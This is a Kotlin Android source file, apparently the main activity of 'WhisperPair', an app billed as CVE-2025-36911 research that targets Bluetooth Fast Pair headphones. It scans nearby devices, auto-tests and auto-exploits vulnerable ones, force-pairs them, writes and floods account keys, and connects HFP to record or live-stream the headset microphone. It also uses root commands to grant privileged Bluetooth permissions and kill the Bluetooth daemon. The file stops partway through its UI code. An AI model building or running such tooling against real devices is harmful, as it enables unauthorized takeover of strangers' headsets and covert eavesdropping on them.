package com.zalexdev.whisperpair

import com.zalexdev.whisperpair.R
import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import java.io.DataOutputStream
import java.io.IOException
import java.util.concurrent.TimeUnit
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.animateColorAsState
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.*
import androidx.compose.material.icons.automirrored.outlined.*
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.draw.scale
import androidx.compose.foundation.Image
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalUriHandler
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import com.zalexdev.whisperpair.ui.theme.*
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread

class MainActivity : ComponentActivity() {
    private var scanner: Scanner? = null
    private var tester: VulnerabilityTester? = null
    private var exploit: FastPairExploit? = null
    private var audioManager: BluetoothAudioManager? = null
    private val devices = mutableStateListOf<FastPairDevice>()
    private val exploitResults = mutableStateMapOf<String, String>()
    private val audioStates = mutableStateMapOf<String, AudioConnectionState>()
    private val pairedDevices = mutableStateListOf<String>()  // Track successfully paired devices
    private var hasShownFirstFailWarning = false
    private val showUnpairWarning = mutableStateOf(false)
    private val showHfpErrorDialog = mutableStateOf(false)
    private val autoTestEnabled = mutableStateOf(false)
    private val autoExploitEnabled = mutableStateOf(false)
    private var rootPermissionsGranted = false
    
    // Debug logging
    private val debugLogs = mutableStateListOf<String>()
    private val showDebugDialog = mutableStateOf(false)
    private val maxDebugLogs = 100
    
    private fun debugLog(tag: String, message: String, isError: Boolean = false) {
        val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(Date())
        val prefix = if (isError) "❌" else "📝"
        val logLine = "$timestamp $prefix [$tag] $message"
        
        // Add to UI buffer
        runOnUiThread {
            debugLogs.add(0, logLine) // Add at top for newest first
            while (debugLogs.size > maxDebugLogs) {
                debugLogs.removeAt(debugLogs.size - 1)
            }
        }
        
        // Also log to logcat
        if (isError) {
            android.util.Log.e("WhisperPair", "[$tag] $message")
        } else {
            android.util.Log.d("WhisperPair", "[$tag] $message")
        }
    }

    data class AudioConnectionState(
        val isConnected: Boolean = false,
        val isRecording: Boolean = false,
        val isListening: Boolean = false,
        val recordingFile: String? = null,
        val message: String? = null,
        val hasHfpError: Boolean = false
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Load saved paired devices
        loadPairedDevices()

        // Load automation settings
        loadAutomationSettings()

        val bluetoothManager = getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val bluetoothAdapter = bluetoothManager?.adapter

        tester = VulnerabilityTester(this)
        exploit = FastPairExploit(this)
        audioManager = BluetoothAudioManager(this)

        audioManager?.initialize { ready ->
            if (ready) {
                android.util.Log.d("WhisperPair", "Audio manager initialized")
                checkExistingHfpConnections()
                // Try to grant system permissions via root for seamless HFP
                setupRootPermissions()
            }
        }

        scanner = Scanner(bluetoothAdapter) { device ->
            runOnUiThread {
                val index = devices.indexOfFirst { it.address == device.address }
                if (index == -1) {
                    devices.add(device)
                    // Auto-test newly discovered devices if enabled
                    if (autoTestEnabled.value && device.status == DeviceStatus.NOT_TESTED && !device.isPairingMode) {
                        testDevice(device)
                    }
                } else {
                    val currentStatus = devices[index].status
                    devices[index] = device.copy(status = currentStatus)
                }
            }
        }

        setContent {
            WhisperPairTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = DarkBackground
                ) {
                    WhisperPairApp(
                        context = this@MainActivity,
                        devices = devices,
                        exploitResults = exploitResults,
                        audioStates = audioStates,
                        pairedDevices = pairedDevices,
                        showUnpairWarning = showUnpairWarning.value,
                        onDismissUnpairWarning = { showUnpairWarning.value = false },
                        showHfpErrorDialog = showHfpErrorDialog.value,
                        onDismissHfpErrorDialog = { showHfpErrorDialog.value = false },
                        debugLogs = debugLogs,
                        showDebugDialog = showDebugDialog.value,
                        onShowDebugDialog = { showDebugDialog.value = true },
                        onDismissDebugDialog = { showDebugDialog.value = false },
                        onClearDebugLogs = { debugLogs.clear() },
                        recordingsDir = getExternalFilesDir(null) ?: filesDir,
                        onScanToggle = { isScanning, showAll ->
                            if (isScanning) scanner?.startScanning(showAll) else scanner?.stopScanning()
                        },
                        onTestDevice = { device -> testDevice(device) },
                        onClearDevices = {
                            devices.clear()
                            exploitResults.clear()
                            audioStates.clear()
                        },
                        onExploitDevice = { device -> exploitDevice(device) },
                        onWriteAccountKey = { device -> writeAccountKey(device) },
                        onFloodKeys = { device -> floodAccountKeys(device) },
                        onConnectHfp = { device -> connectHfp(device) },
                        onStartRecording = { device -> startRecording(device) },
                        onStopRecording = { device -> stopRecording(device) },
                        onStartListening = { device -> startListening(device) },
                        onStopListening = { device -> stopListening(device) },
                        onCheckConnections = { checkExistingHfpConnections() },
                        onFixConnection = { device -> fixConnection(device) },
                        autoTestEnabled = autoTestEnabled.value,
                        onAutoTestToggle = { enabled -> setAutoTest(enabled) },
                        autoExploitEnabled = autoExploitEnabled.value,
                        onAutoExploitToggle = { enabled -> setAutoExploit(enabled) },
                        onTestAllDevices = { testAllDevices() },
                        onExploitAllVulnerable = { exploitAllVulnerable() },
                        onReconnectAll = { reconnectAllDevices() },
                        onExportDevices = { exportPairedDevices() }
                    )
                }
            }
        }
    }

    private fun testDevice(device: FastPairDevice) {
        val index = devices.indexOfFirst { it.address == device.address }
        if (index != -1) {
            devices[index] = devices[index].copy(status = DeviceStatus.TESTING)
            tester?.testDevice(device.address) { status ->
                runOnUiThread {
                    val newIndex = devices.indexOfFirst { it.address == device.address }
                    if (newIndex != -1) {
                        devices[newIndex] = devices[newIndex].copy(status = status)

                        // Auto-exploit if device is vulnerable and auto-exploit is enabled
                        if (autoExploitEnabled.value && status == DeviceStatus.VULNERABLE) {
                            exploitDevice(devices[newIndex])
                        }

                        // Show first-fail warning if device is patched/error and we haven't shown it yet
                        if (!hasShownFirstFailWarning && (status == DeviceStatus.PATCHED || status == DeviceStatus.ERROR)) {
                            hasShownFirstFailWarning = true
                            showUnpairWarning.value = true
                        }
                    }
                }
            }
        }
    }

    private fun checkExistingHfpConnections() {
        val am = audioManager ?: return
        val connectedDevices = am.getConnectedDevices()
        for (btDevice in connectedDevices) {
            val address = btDevice.address
            if (pairedDevices.contains(address)) {
                audioStates[address] = AudioConnectionState(
                    isConnected = true,
                    message = "HFP connected"
                )
            }
        }
    }

    private fun loadPairedDevices() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val saved = prefs.getStringSet(KEY_PAIRED_DEVICES, emptySet()) ?: emptySet()
        pairedDevices.clear()
        pairedDevices.addAll(saved)
    }

    private fun savePairedDevices() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putStringSet(KEY_PAIRED_DEVICES, pairedDevices.toSet()).apply()
    }

    private fun addPairedDevice(address: String) {
        if (!pairedDevices.contains(address)) {
            pairedDevices.add(address)
            savePairedDevices()
        }
    }

    private fun loadAutomationSettings() {
        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        autoTestEnabled.value = prefs.getBoolean(KEY_AUTO_TEST, false)
        autoExploitEnabled.value = prefs.getBoolean(KEY_AUTO_EXPLOIT, false)
    }

    private fun setAutoTest(enabled: Boolean) {
        autoTestEnabled.value = enabled
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_AUTO_TEST, enabled).apply()
    }

    private fun setAutoExploit(enabled: Boolean) {
        autoExploitEnabled.value = enabled
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_AUTO_EXPLOIT, enabled).apply()
    }

    private fun testAllDevices() {
        val untested = devices.filter { 
            it.status == DeviceStatus.NOT_TESTED && !it.isPairingMode 
        }
        untested.forEach { device -> testDevice(device) }
        if (untested.isEmpty()) {
            Toast.makeText(this, "No untested devices found", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Testing ${untested.size} devices...", Toast.LENGTH_SHORT).show()
        }
    }

    private fun exploitAllVulnerable() {
        val vulnerable = devices.filter { 
            it.status == DeviceStatus.VULNERABLE && !pairedDevices.contains(it.address)
        }
        vulnerable.forEach { device -> exploitDevice(device) }
        if (vulnerable.isEmpty()) {
            Toast.makeText(this, "No vulnerable devices to exploit", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Exploiting ${vulnerable.size} devices...", Toast.LENGTH_SHORT).show()
        }
    }

    private fun reconnectAllDevices() {
        val pairedList = devices.filter { pairedDevices.contains(it.address) }
        val disconnectedDevices = pairedList.filter { device ->
            val state = audioStates[device.address]
            state?.isConnected != true
        }
        
        if (disconnectedDevices.isEmpty()) {
            Toast.makeText(this, "All devices already connected or no devices to reconnect", Toast.LENGTH_SHORT).show()
            return
        }
        
        Toast.makeText(this, "Reconnecting ${disconnectedDevices.size} devices...", Toast.LENGTH_SHORT).show()
        
        // Stagger connections with 2-second delay to avoid overwhelming Bluetooth stack
        disconnectedDevices.forEachIndexed { index, device ->
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                connectHfp(device)
            }, index * 2000L)
        }
    }

    private fun exportPairedDevices() {
        if (pairedDevices.isEmpty()) {
            Toast.makeText(this, "No paired devices to export", Toast.LENGTH_SHORT).show()
            return
        }

        val timestamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
        val exportContent = buildString {
            appendLine("# WhisperPair Paired Devices Export")
            appendLine("# Exported: $timestamp")
            appendLine("# CVE-2025-36911 Vulnerability Research")
            appendLine()
            appendLine("| Address | Name | Manufacturer | Model ID |")
            appendLine("|---------|------|--------------|----------|")

            for (address in pairedDevices) {
                val device = devices.find { it.address == address }
                if (device != null) {
                    appendLine("| ${device.address} | ${device.displayName} | ${device.manufacturer ?: "Unknown"} | ${device.modelId ?: "N/A"} |")
                } else {
                    appendLine("| $address | Unknown | Unknown | N/A |")
                }
            }

            appendLine()
            appendLine("Total: ${pairedDevices.size} devices")
        }

        try {
            val exportDir = getExternalFilesDir(null) ?: filesDir
            val exportFile = java.io.File(exportDir, "whisperpair_export_$timestamp.md")
            exportFile.writeText(exportContent)

            // Share the file
            val uri = androidx.core.content.FileProvider.getUriForFile(
                this,
                "${packageName}.provider",
                exportFile
            )
            val shareIntent = Intent(Intent.ACTION_SEND).apply {
                type = "text/markdown"
                putExtra(Intent.EXTRA_STREAM, uri)
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(Intent.createChooser(shareIntent, "Export Paired Devices"))
        } catch (e: Exception) {
            Toast.makeText(this, "Export failed: ${e.message}", Toast.LENGTH_SHORT).show()
            android.util.Log.e("WhisperPair", "Export failed", e)
        }
    }

    private fun exploitDevice(device: FastPairDevice) {
        exploitResults[device.address] = "Initializing..."

        exploit?.exploit(
            targetAddress = device.address,
            onProgress = { progress ->
                runOnUiThread {
                    exploitResults[device.address] = progress
                }
            },
            onResult = { result ->
                runOnUiThread {
                    when (result) {
                        is FastPairExploit.ExploitResult.Success -> {
                            exploitResults[device.address] = "PAIRED! BR/EDR: ${result.brEdrAddress}"
                            addPairedDevice(device.address)
                        }
                        is FastPairExploit.ExploitResult.PartialSuccess -> {
                            exploitResults[device.address] = "PARTIAL: ${result.brEdrAddress} - ${result.message}"
                            addPairedDevice(device.address)
                        }
                        is FastPairExploit.ExploitResult.Failed -> {
                            exploitResults[device.address] = "FAILED: ${result.reason}"
                        }
                        is FastPairExploit.ExploitResult.AccountKeyResult -> {
                            exploitResults[device.address] = if (result.success) "KEY: ${result.message}" else "FAILED: ${result.message}"
                        }
                        else -> {}
                    }
                }
            }
        )
    }

    private fun writeAccountKey(device: FastPairDevice) {
        exploitResults[device.address] = "Writing account key..."

        exploit?.writeAccountKeyDirect(device.address) { result ->
            runOnUiThread {
                when (result) {
                    is FastPairExploit.ExploitResult.AccountKeyResult -> {
                        exploitResults[device.address] = if (result.success)
                            "KEY WRITTEN! Device registered."
                        else
                            "KEY FAILED: ${result.message}"
                    }
                    else -> exploitResults[device.address] = "Unexpected result"
                }
            }
        }
    }

    private fun floodAccountKeys(device: FastPairDevice) {
        exploitResults[device.address] = "Flooding: 0/10..."

        exploit?.floodAccountKeys(device.address, 10) { current, total, done ->
            runOnUiThread {
                exploitResults[device.address] = if (done) "FLOOD: $current/$total done" else "Flooding: $current/$total..."
            }
        }
    }

    private fun connectHfp(device: FastPairDevice) {
        val am = audioManager ?: return
        audioStates[device.address] = AudioConnectionState(message = "Connecting HFP...")

        am.connectAudioProfile(device.address) { state ->
            runOnUiThread {
                when (state) {
                    is BluetoothAudioManager.AudioState.Connected -> {
                        audioStates[device.address] = AudioConnectionState(
                            isConnected = true,
                            message = "HFP connected - ready for audio"
                        )
                    }
                    is BluetoothAudioManager.AudioState.Error -> {
                        // Check if this is a permission/restriction error that root can bypass
                        if (state.message == "HFP_PERMISSION_DENIED" || state.message == "HFP_MANUAL_REQUIRED") {
                            // Try root-based connection instead of showing dialog
                            audioStates[device.address] = AudioConnectionState(
                                message = "Standard connection failed, trying Root...",
                                hasHfpError = false
                            )
                            connectHfpWithRoot(device.address)
                        } else {
                            // Other errors (timeout, etc.) - show dialog
                            val userMessage = when (state.message) {
                                "HFP_TIMEOUT" -> "Connection timed out"
                                else -> state.message
                            }
                            audioStates[device.address] = AudioConnectionState(
                                message = userMessage,
                                hasHfpError = true
                            )
                            showHfpErrorDialog.value = true
                        }
                    }
                    else -> {}
                }
            }
        }
    }

    // Execute root command via stdin (Magisk/KernelSU compatible)
    private fun executeRootCommand(command: String, timeoutSeconds: Long = 30): Pair<Int, String> {
        debugLog("ROOT", "Executing: $command")
        
        var process: Process? = null
        val startTime = System.currentTimeMillis()
        
        return try {
            process = Runtime.getRuntime().exec("su")
            
            // Write command to stdin
            DataOutputStream(process.outputStream).use { outputStream ->
                outputStream.writeBytes("$command\n")
                outputStream.writeBytes("exit \$?\n")
                outputStream.flush()
            }
            
            // Read streams BEFORE waitFor() to prevent buffer deadlock
            var stdOutput = ""
            var errorOutput = ""
            
            val stdoutThread = thread {
                stdOutput = try {
                    process.inputStream.bufferedReader().use { it.readText() }
                } catch (e: Exception) { "" }
            }
            val stderrThread = thread {
                errorOutput = try {
                    process.errorStream.bufferedReader().use { it.readText() }
                } catch (e: Exception) { "" }
            }
            
            val completed = process.waitFor(timeoutSeconds, TimeUnit.SECONDS)
            val elapsed = System.currentTimeMillis() - startTime
            
            // Wait for stream reading threads
            stdoutThread.join(2000)
            stderrThread.join(2000)
            
            val exitCode = if (completed) {
                process.exitValue()
            } else {
                process.destroyForcibly()
                -2 // Timeout
            }
            
            // Log results
            if (stdOutput.isNotBlank()) debugLog("ROOT", "stdout: ${stdOutput.take(200)}")
            if (errorOutput.isNotBlank()) debugLog("ROOT", "stderr: ${errorOutput.take(200)}", true)
            debugLog("ROOT", "Exit: $exitCode (${elapsed}ms)")
            
            Pair(exitCode, errorOutput)
        } catch (e: IOException) {
            debugLog("ROOT", "IOException: ${e.message}", true)
            Pair(-1, "su not found or permission denied: ${e.message}")
        } catch (e: InterruptedException) {
            debugLog("ROOT", "Interrupted: ${e.message}", true)
            Thread.currentThread().interrupt()
            Pair(-1, "Command interrupted")
        } catch (e: Exception) {
            debugLog("ROOT", "${e.javaClass.simpleName}: ${e.message}", true)
            Pair(-1, "Error: ${e.message}")
        } finally {
            process?.destroy()
        }
    }

    // Grant BT permissions via root (MODIFY_PHONE_STATE, BLUETOOTH_PRIVILEGED)
    private fun setupRootPermissions() {
        thread {
            val packageName = this.packageName
            val permissions = listOf(
                "android.permission.MODIFY_PHONE_STATE",
                "android.permission.BLUETOOTH_PRIVILEGED",
                "android.permission.BLUETOOTH_CONNECT",
                "android.permission.BLUETOOTH_ADMIN"
            )
            
            var anySuccess = false
            for (permission in permissions) {
                val (exitCode, _) = executeRootCommand("pm grant $packageName $permission", 10)
                if (exitCode == 0) {
                    android.util.Log.d("WhisperPair", "Granted permission: $permission")
                    anySuccess = true
                } else {
                    android.util.Log.w("WhisperPair", "Failed to grant: $permission (may already have or not applicable)")
                }
            }
            
            rootPermissionsGranted = anySuccess
            
            if (anySuccess) {
                android.util.Log.d("WhisperPair", "Root permissions setup complete - HFP should work seamlessly")
            }
        }
    }

    // Connect HFP via root (tries cmd bluetooth_manager, then broadcast fallback)
    private fun connectHfpWithRoot(address: String) {
        thread {
            runOnUiThread {
                audioStates[address] = AudioConnectionState(
                    message = "Connecting via Root..."
                )
            }

            var command = "cmd bluetooth_manager connect $address 1"
            var (exitCode, errorOutput) = executeRootCommand(command)
            
            // Fallback if cmd not available
            if (exitCode != 0 && (errorOutput.contains("not found", ignoreCase = true) || 
                                   errorOutput.contains("Unknown command", ignoreCase = true))) {
                android.util.Log.d("WhisperPair", "cmd bluetooth_manager not available, trying alternative...")
                
                // Try to connect via settings provider or direct service call
                // Format address for service call (needs to be handled differently)
                command = "svc bluetooth enable && am broadcast -a android.bluetooth.device.action.ACL_CONNECTED --es android.bluetooth.device.extra.DEVICE $address"
                val result = executeRootCommand(command)
                exitCode = result.first
                errorOutput = result.second
            }

            runOnUiThread {
                when {
                    exitCode == 0 -> {
                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                            val am = audioManager
                            if (am != null && am.isHfpConnected(address)) {
                                audioStates[address] = AudioConnectionState(
                                    isConnected = true,
                                    message = "HFP connected (Root)"
                                )
                            } else {
                                audioStates[address] = AudioConnectionState(
                                    isConnected = true,
                                    message = "HFP connected (Root)"
                                )
                            }
                        }, 2000)
                    }
                    exitCode == -2 -> {
                        android.util.Log.e("WhisperPair", "Root HFP timed out")
                        audioStates[address] = AudioConnectionState(
                            message = "Root command timed out",
                            hasHfpError = true
                        )
                        showHfpErrorDialog.value = true
                    }
                    exitCode == -1 -> {
                        // Process failed to execute properly
                        val message = if (errorOutput.contains("permission", ignoreCase = true) ||
                                        errorOutput.contains("denied", ignoreCase = true)) {
                            "Root permission denied"
                        } else if (errorOutput.contains("SELinux", ignoreCase = true) ||
                                   errorOutput.contains("avc:", ignoreCase = true)) {
                            "SELinux blocking command"
                        } else if (errorOutput.contains("not found", ignoreCase = true) ||
                                   errorOutput.contains("No such", ignoreCase = true)) {
                            "bluetooth_manager service not found"
                        } else {
                            "Root failed (-1): Check Magisk/SELinux"
                        }
                        android.util.Log.e("WhisperPair", "Root HFP failed: $message, error: $errorOutput")
                        audioStates[address] = AudioConnectionState(
                            message = message,
                            hasHfpError = true
                        )
                        showHfpErrorDialog.value = true
                    }
                    else -> {
                        // Non-zero exit code
                        val message = when {
                            errorOutput.contains("Unknown command", ignoreCase = true) ->
                                "bluetooth_manager command not supported"
                            errorOutput.contains("not connected", ignoreCase = true) ->
                                "Device not in range"
                            else -> "Root failed (exit: $exitCode)"
                        }
                        android.util.Log.e("WhisperPair", "Root HFP failed: exit=$exitCode, error=$errorOutput")
                        audioStates[address] = AudioConnectionState(
                            message = message,
                            hasHfpError = true
                        )
                        showHfpErrorDialog.value = true
                    }
                }
            }
        }
    }

    private fun startRecording(device: FastPairDevice) {
        val am = audioManager ?: return
        val outputDir = getExternalFilesDir(null) ?: filesDir

        audioStates[device.address] = audioStates[device.address]?.copy(
            isRecording = true, message = "Recording..."
        ) ?: AudioConnectionState(isRecording = true, message = "Recording...")

        am.startRecording(
            outputDir = outputDir,
            onStateChange = { state ->
                runOnUiThread {
                    when (state) {
                        is BluetoothAudioManager.AudioState.Recording -> {
                            audioStates[device.address] = audioStates[device.address]?.copy(
                                isRecording = true, message = "Recording microphone..."
                            ) ?: AudioConnectionState(isRecording = true)
                        }
                        is BluetoothAudioManager.AudioState.Error -> {
                            audioStates[device.address] = audioStates[device.address]?.copy(
                                isRecording = false, message = "Error: ${state.message}"
                            ) ?: AudioConnectionState(message = state.message)
                        }
                        else -> {}
                    }
                }
            },
            onRecordingComplete = { info ->
                runOnUiThread {
                    val duration = info.durationMs / 1000
                    audioStates[device.address] = audioStates[device.address]?.copy(
                        isRecording = false,
                        recordingFile = info.file.absolutePath,
                        message = "Saved: ${info.file.name} (${duration}s)"
                    ) ?: AudioConnectionState(recordingFile = info.file.absolutePath)
                }
            }
        )
    }

    private fun stopRecording(device: FastPairDevice) {
        audioManager?.stopRecording()
    }

    private fun startListening(device: FastPairDevice) {
        val am = audioManager ?: return

        audioStates[device.address] = audioStates[device.address]?.copy(
            isListening = true, message = "Starting live audio..."
        ) ?: AudioConnectionState(isListening = true, message = "Starting...")

        am.startListening { state ->
            runOnUiThread {
                when (state) {
                    is BluetoothAudioManager.AudioState.Listening -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = true, message = "LIVE - Listening to microphone"
                        ) ?: AudioConnectionState(isListening = true)
                    }
                    is BluetoothAudioManager.AudioState.Error -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = false, message = "Error: ${state.message}"
                        ) ?: AudioConnectionState(message = state.message)
                    }
                    is BluetoothAudioManager.AudioState.Connected -> {
                        audioStates[device.address] = audioStates[device.address]?.copy(
                            isListening = false, message = "Stopped listening"
                        ) ?: AudioConnectionState(isConnected = true)
                    }
                    else -> {}
                }
            }
        }
    }

    private fun stopListening(device: FastPairDevice) {
        audioManager?.stopListening()
        audioStates[device.address] = audioStates[device.address]?.copy(
            isListening = false, message = "Stopped"
        ) ?: AudioConnectionState()
    }

    // Force unpair via reflection (BluetoothDevice.removeBond)
    private fun forceRemoveBond(device: FastPairDevice) {
        try {
            val bluetoothManager = getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
            val adapter = bluetoothManager?.adapter ?: run {
                runOnUiThread {
                    Toast.makeText(this, "Bluetooth adapter not available", Toast.LENGTH_SHORT).show()
                }
                return
            }

            val btDevice: BluetoothDevice = adapter.getRemoteDevice(device.address)
            val removeBondMethod = btDevice.javaClass.getMethod("removeBond")
            val result = removeBondMethod.invoke(btDevice) as Boolean

            if (result) {
                if (pairedDevices.contains(device.address)) {
                    pairedDevices.remove(device.address)
                    savePairedDevices()
                }
                audioStates.remove(device.address)
                exploitResults.remove(device.address)

                runOnUiThread {
                    Toast.makeText(this, "Bond removed for ${device.displayName}", Toast.LENGTH_SHORT).show()
                }
                android.util.Log.d("WhisperPair", "Successfully removed bond for ${device.address}")
            } else {
                runOnUiThread {
                    Toast.makeText(this, "Failed to remove bond", Toast.LENGTH_SHORT).show()
                }
                android.util.Log.w("WhisperPair", "removeBond() returned false for ${device.address}")
            }
        } catch (e: NoSuchMethodException) {
            runOnUiThread {
                Toast.makeText(this, "removeBond method not found", Toast.LENGTH_SHORT).show()
            }
            android.util.Log.e("WhisperPair", "removeBond method not found", e)
        } catch (e: SecurityException) {
            runOnUiThread {
                Toast.makeText(this, "Permission denied for removeBond", Toast.LENGTH_SHORT).show()
            }
            android.util.Log.e("WhisperPair", "Security exception for removeBond", e)
        } catch (e: Exception) {
            runOnUiThread {
                Toast.makeText(this, "Error removing bond: ${e.message}", Toast.LENGTH_SHORT).show()
            }
            android.util.Log.e("WhisperPair", "Error removing bond", e)
        }
    }

    // Kill Bluetooth daemon to force stack restart (root)
    private fun restartBluetoothStack() {
        thread {
            val (exitCode, errorOutput) = executeRootCommand("pkill -9 com.android.bluetooth")

            runOnUiThread {
                when {
                    exitCode == 0 -> {
                        Toast.makeText(
                            this,
                            "Bluetooth stack restarting... Please wait a few seconds.",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                    exitCode == -2 -> {
                        Toast.makeText(
                            this,
                            "Command timed out - Bluetooth may be unresponsive",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                    exitCode == -1 -> {
                        val message = when {
                            errorOutput.contains("permission", ignoreCase = true) ||
                            errorOutput.contains("denied", ignoreCase = true) -> "Root permission denied"
                            errorOutput.contains("SELinux", ignoreCase = true) -> "SELinux blocking command"
                            else -> "Root failed (-1): su not available or Magisk issue"
                        }
                        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
                    }
                    else -> {
                        Toast.makeText(
                            this,
                            "Command failed (exit: $exitCode)",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }
            }
            android.util.Log.d("WhisperPair", "restartBluetoothStack exit=$exitCode, error=$errorOutput")
        }
    }

    // Fix zombie connection: unbond + restart BT stack
    private fun fixConnection(device: FastPairDevice) {
        forceRemoveBond(device)
        thread {
            Thread.sleep(500)
            restartBluetoothStack()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        scanner?.stopScanning()
        audioManager?.release()
    }
}

enum class Screen { Scanner, Paired, Recordings }

private const val PREFS_NAME = "whisperpair_prefs"
private const val KEY_DISCLAIMER_ACCEPTED = "disclaimer_accepted"
private const val KEY_PAIRED_DEVICES = "paired_devices"
private const val KEY_AUTO_TEST = "auto_test_enabled"
private const val KEY_AUTO_EXPLOIT = "auto_exploit_enabled"

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun WhisperPairApp(
    context: Context,
    devices: List<FastPairDevice>,
    exploitResults: Map<String, String>,
    audioStates: Map<String, MainActivity.AudioConnectionState>,
    pairedDevices: List<String>,
    showUnpairWarning: Boolean,
    onDismissUnpairWarning: () -> Unit,
    showHfpErrorDialog: Boolean,
    onDismissHfpErrorDialog: () -> Unit,
    debugLogs: List<String>,
    showDebugDialog: Boolean,
    onShowDebugDialog: () -> Unit,
    onDismissDebugDialog: () -> Unit,
    onClearDebugLogs: () -> Unit,
    recordingsDir: File,
    onScanToggle: (Boolean, Boolean) -> Unit,
    onTestDevice: (FastPairDevice) -> Unit,
    onClearDevices: () -> Unit,
    onExploitDevice: (FastPairDevice) -> Unit,
    onWriteAccountKey: (FastPairDevice) -> Unit,
    onFloodKeys: (FastPairDevice) -> Unit,
    onConnectHfp: (FastPairDevice) -> Unit,
    onStartRecording: (FastPairDevice) -> Unit,
    onStopRecording: (FastPairDevice) -> Unit,
    onStartListening: (FastPairDevice) -> Unit,
    onStopListening: (FastPairDevice) -> Unit,
    onCheckConnections: () -> Unit,
    onFixConnection: (FastPairDevice) -> Unit,
    autoTestEnabled: Boolean,
    onAutoTestToggle: (Boolean) -> Unit,
    autoExploitEnabled: Boolean,
    onAutoExploitToggle: (Boolean) -> Unit,
    onTestAllDevices: () -> Unit,
    onExploitAllVulnerable: () -> Unit,
    onReconnectAll: () -> Unit,
    onExportDevices: () -> Unit
) {
    val prefs = remember { context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE) }
    var currentScreen by remember { mutableStateOf(Screen.Scanner) }
    var showAboutDialog by remember { mutableStateOf(false) }
    var showDisclaimerDialog by remember { mutableStateOf(!prefs.getBoolean(KEY_DISCLAIMER_ACCEPTED, false)) }

    // Scanner state - lifted up to persist across tab switches
    var isScanning by remember { mutableStateOf(false) }
    var showAllDevices by remember { mutableStateOf(false) }  // Default to Fast Pair only

    Scaffold(
        bottomBar = {
            NavigationBar(containerColor = DarkSurface) {
                NavigationBarItem(
                    selected = currentScreen == Screen.Scanner,
                    onClick = { currentScreen = Screen.Scanner },
                    icon = { Icon(Icons.AutoMirrored.Filled.BluetoothSearching, contentDescription = null) },
                    label = { Text("Scanner") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = CyanPrimary,
                        selectedTextColor = CyanPrimary,
                        indicatorColor = CyanPrimary.copy(alpha = 0.2f)
                    )
                )
                NavigationBarItem(
                    selected = currentScreen == Screen.Paired,
                    onClick = { currentScreen = Screen.Paired },
                    icon = {
                        BadgedBox(badge = {
                            if (pairedDevices.isNotEmpty()) {
                                Badge(containerColor = VulnerableRed) { Text("${pairedDevices.size}") }
                            }
                        }) {
                            Icon(Icons.Default.Headphones, contentDescription = null)
                        }
                    },
                    label = { Text("Paired") },
                    colors = NavigationBarItemDefaults.colors(
                        selectedIconColor = CyanPrimary,
                        selectedTextColor = CyanPrimary,
                        indicatorColor = CyanPrimary.copy(alpha = 0.2f)
                    )
                )
                NavigationBarItem(
                    selected = currentScreen == Screen.Recordings,
                    onClick = { currentScreen = Screen.Recordings },
